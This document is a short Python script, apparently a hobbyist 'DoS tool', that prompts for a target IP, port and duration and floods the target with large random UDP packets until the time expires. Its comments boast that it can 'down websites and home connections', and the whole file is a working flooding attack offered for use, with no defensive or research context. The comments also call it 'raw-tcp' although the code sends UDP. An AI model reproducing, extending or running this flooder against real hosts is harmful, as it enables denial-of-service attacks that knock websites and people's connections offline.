import os
import sys
import time
import socket
import random
import colorama
from colorama import Fore, Back, Style
colorama.init()

# type this in cmd
# pip install colorama

# if the file still doesnt load just type this
# pip install (every import)

# this has the power to down websites and home connections
# the websites you can down are limited

# methods [raw-tcp]
# 0 bypass power

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(65500)

print(Fore.RED + 'synxacks dos tool')
print("")
print("methods [raw-udp]")
print("")
ip = input('ip : ')
port = int(input('port : '))
dur = int(input('time : '))
timeout = time.time() + dur
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        
        print("Sent",sent,"packets to",ip,"through",port,)
    except KeyboardInterrupt:
        sys.exit()

                     
